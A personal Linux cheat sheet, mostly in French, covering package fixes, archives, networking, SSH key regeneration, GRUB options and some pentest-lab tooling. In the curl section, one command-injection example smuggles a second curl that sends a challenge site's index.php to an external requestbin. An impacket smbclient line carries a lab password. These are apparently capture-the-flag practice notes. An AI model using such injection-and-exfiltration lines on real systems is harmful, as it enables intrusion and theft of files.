# Linux Basics

## Clavier

```shell
setxkbmap fr  #ne marche que lorsque X est lancé
loadkeys fr
```

##  apt debug Dependences

```shell
apt --fix-broken install
apt-get install --fix-missing
apt-get install --fix-broken
```

## info_fichiers

```shell
$ file executable.2772.exe 
executable.2772.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

## hexa

### editeur sous kali: 

* hexeditor
* bless

### mettre du code exa dans un fichier binaire: 

```shell
xxd -r -p input.hex output.bin
```
### dumper un binaire en hexa: 

```shell
hexdump -C
```


## Nvidia GPU Hashact

```shell
apt install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit nvidia-msi
hashcat -I
```

## file explorer linux

ouvrir l'explorateur de fichier: xdg-open .


## runlevel linux

### runlevel 3 au grub:
ajouter 3 apres “quiet” dans le GRUB


## Fichiers

### Compress file
```shell
zip compressed.zip file_name.txt
```
### Compress Folder

```shell
zip -r compressed.zip folder_name/
```

### Uncompress zipped file to current directory

```shell
unzip compressed.zip
```

### Uncompress zipped to current directory to specific location

```shell
unzip compressed.zip -d ~/Documents
```

### Compress a file / folder

```shell
tar zcvf compressed.tar.gz folder_name
```

### Uncompress a tar file

```shell
tar zxvf compressed.tar.gz
```

### tout détarer:

```shell
for i in *.tar.gz; do tar -xzvf $i; done
```

## ## usb

dmesg pour identifier la clé (dans l'éxemble /dev/sdb) Ne pas monter la clé ou faire un unmount

```sh
dd if=kali-linux-blablabla.iso of=/dev/sdb
dd if=kali-linux-2019.4-amd64.iso of=/dev/sdb bs=512k
```

ou avec `gnome-disks` (sudo apt install gnome-disk-utility)


## curl

### Post exemple:

```sh
curl -X POST -d name=value http://challenge01.root-me.org/web-serveur/ch53/index.php
curl http://admin.academy.htb:31817/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```

### requestbin exemple:

```sh
curl -d '{ "name": "Princess Leia" }' \
  -H "Content-Type: application/json" \
  https://enirdd6d0146.x.pipedream.net/
```

### upload data:

```sh
 curl -d "@data.txt" -X POST http://localhost:3000/data
 exemple avec injection de commande:
 curl -X POST -d 'ip=127.0.0.1%0acurl -X POST -d @index.php https://enzuva1p723tj.x.pipedream.net' http://challenge01.root-me.org/web-serveur/ch53/index.php
```
 
### Certificat non legitime

-k OU --insecure


## Effacement avec shred

```sh
find <dir> -type f -exec shred {} \;
```

## cat in file

```shell
$ cat > MyFile
write the text in the console, when done press CTRL+D
Now, if you’ll open MyFile, you’ll se that it contains the text  you’ve entered. Be carefull as if the file you use is not empty, the  content will be erased before adding what you’re writting. 


cat <<EOF > print.sh
```

# IP Linux

```sh
ip addr add 192.168.1.5/24 dev eth0
ifconfig eth0 192.168.1.5 netmask 255.255.255.0

ip link set eth0 [up|down]
ifconfig wlan0 down

route add default gw 192.168.1.254
```



## route

Display Current Routing Table Using ip command
By using the ip command, you can set up and view static route. For example, to display the current routing table you can type the command:

### lister et ajouter

```shell
$ ip route show
Sample output:
192.168.2.0/24 dev eth1 proto kernel  scope link  src 192.168.2.1
192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.2
default via 192.168.1.254 dev eth0You can add static route using following command:
ip route add {NETWORK} via {IP} dev {DEVICE}
For example network 192.168.55.0/24 available via 192.168.1.254:

$ ip route add 192.168.55.0/24 via 192.168.1.254 dev eth1

# Alternatively, you can use old good route command too:

$ route add -net 192.168.55.0 netmask 255.255.255.0 gw 192.168.1.254 dev eth1
```

## SSH re-install VM

Ne pas garder les cléfs par défaut sur les serveur ssh (attaque man in the middle)

cd /etc/ssh/
mkdir default_kali_keys
mv ssh_host_* default_kali_keys/
 
dpkg-reconfigure openssh-server

md5sum ssh_host_*

cd default_kali_keys/
md5sum *

systemctl restart ssh

### ssh X11

pour du graphique activer le Forward X11 et

    ForwardX11 yes
    ForwardX11Trusted no

(trusted = moins secure)

lancer ssh -X coté client


## smbclient

### sous xfce:

thunar smb://10.10.10.178/Data

###  impacket:

/usr/share/doc/python3-impacket/examples/smbclient.py C.Smith:xRxRxPANCAK3SxRxRx@10.10.10.178

## Logs

### logcheck

apt-get install logcheck
sudo -u logcheck logcheck -o
sudo -u logcheck logcheck -o > /data/$(date +"%m-%d-%Y-%T").log

### pbm de bout

## Boot

```
> Option interessant à ajouter au GRUB (presser "e" au boot ou éditer le
> "acpi=off" -> désactive énormément de chose dont la gestion de l'alim et acceleration materiel
> "nouveau.blacklist=1" -> désactive les drivers nouveaux
> "nomodeset" -> n'utilise pas les module graphique du kernel durant le boot jusqu'au chargement de X)
> 
> 
> Pbm d'écran / compatibilité nouveau /nvidia:
> 1- booter avec nomodeset ou nouveau.blacklist=1
> 2- installer le package nvidia-driver
> 3- rebooter (sans options supplémentaire, nouveau sera shooté automatiquement)

pour les probleme de driver nvidia cf "Nvidia GPU"

si freeze: utiliser les tty (ctrl+alt+<1,2,3,4...>)

ou démarrer sans interface graphique: cf "runlevel"

aucun service en écoute sur le réseau apres install sauf client dhcp:
systemctl disable rpcbind
```
